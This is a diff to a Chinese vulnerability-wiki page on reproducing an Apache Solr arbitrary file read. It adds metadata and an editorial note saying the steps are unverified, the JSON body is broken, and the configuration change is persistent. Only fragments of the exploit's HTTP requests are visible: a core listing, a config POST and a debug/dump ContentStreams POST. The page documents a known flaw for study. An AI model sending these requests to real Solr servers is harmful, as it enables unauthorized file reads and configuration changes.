@@ -1,8 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "Apache Solr 任意文件读取漏洞复现"
+product: "Apache Solr"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "core可用、可写配置、dump handler及文件权限满足"
+source_url: "https://mp.weixin.qq.com/s/SFC8X7o2kfFASHmLeD3-UQ"
+source_status: "recorded"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-e2691baf3eec2acf52fab414"
+entity_id: "ve-e2691baf3eec2acf52fab414"
+schema_version: "1"
 ---
 
 # Apache Solr 任意文件读取漏洞复现
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：core可用、可写配置、dump handler及文件权限满足
+- 证据范围：说明200/提示只能作为待确认，较纯误报脚本谨慎；实际配置body仍损坏。
+
+### 本次正文校订
+
+- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- JSON右括号前多反斜线，正文请求不是有效JSON
+- <=8.8.1只是旧文声称范围，无官方修复/配置边界说明
+- 编写检测脚本段只有截图没代码，不算完整工具
+- 需明确持久配置修改并恢复，不能当纯只读检测
+- 大量个人主页/推广与内容无关
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SFC8X7o2kfFASHmLeD3-UQ)
@@ -47,7 +89,7 @@ http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
 
 详细数据包
 
-```
+```http
 GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1
 Host: 127.0.0.1:8983
 Upgrade-Insecure-Requests: 1
@@ -64,7 +106,7 @@ Connection: close
 
 详细数据包：
 
-```
+```http
 POST /solr/tesla/config HTTP/1.1
 Host: 127.0.0.1:8983
 Content-Length: 80
@@ -88,7 +130,7 @@ Connection: close
 
 详细数据包：
 
-```
+```http
 POST /solr/tesla/debug/dump?param=ContentStreams HTTP/1.1
 Host: 127.0.0.1:8983
 Content-Length: 29
